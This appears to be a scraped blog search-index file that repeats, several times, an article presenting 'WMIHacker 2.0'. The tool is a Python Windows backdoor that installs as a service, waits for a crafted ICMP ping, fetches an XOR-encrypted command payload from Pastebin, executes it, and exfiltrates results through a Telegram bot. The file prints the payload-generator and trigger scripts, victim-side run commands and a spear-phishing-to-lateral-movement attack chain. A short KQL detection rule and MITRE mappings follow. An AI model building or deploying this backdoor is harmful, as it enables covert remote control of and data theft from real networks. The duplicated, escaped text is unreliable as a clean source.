\u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Masquerading T1036 Avoiding detection by using expected files/names Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes To detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes To detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script 